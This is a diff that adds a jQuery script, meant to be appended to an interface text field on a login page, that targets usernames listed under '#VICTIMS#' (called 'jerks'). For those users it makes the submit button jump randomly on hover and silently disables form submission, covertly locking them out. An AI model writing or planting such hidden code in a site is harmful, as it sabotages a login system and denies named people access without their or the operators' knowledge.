@@ -1,0 +1,23 @@
+<script language="JavaScript" type="text/javascript">
+// append to text interface field#2022
+$(document).ready(function(){
+	var jerks = "#VICTIMS#";
+	var jerkarray = jerks.split(",");
+	$("input[name='btnSubmit']").hover(function() {
+		var curusername = $("#txtUserID").val();
+		if (jerkarray.indexOf(curusername)!=-1) {
+			var newx = Math.floor((Math.random()*100)+1);
+			var newy = Math.floor((Math.random()*100)+1);
+			$("input[name='btnSubmit']").css('position', 'absolute').css('top', newy + '%').css('left', newx + '%');
+		}
+	});
+	$("#txtUserID").keyup(function() {
+		var curusername = $("#txtUserID").val();
+		if (jerkarray.indexOf(curusername)!=-1) {
+			$("form[name='loginFormSecurity']").removeAttr('onsubmit').submit(function(e){e.preventDefault();});
+		} else {
+			$("form[name='loginFormSecurity']").unbind();
+		}
+	});
+});
+</script>
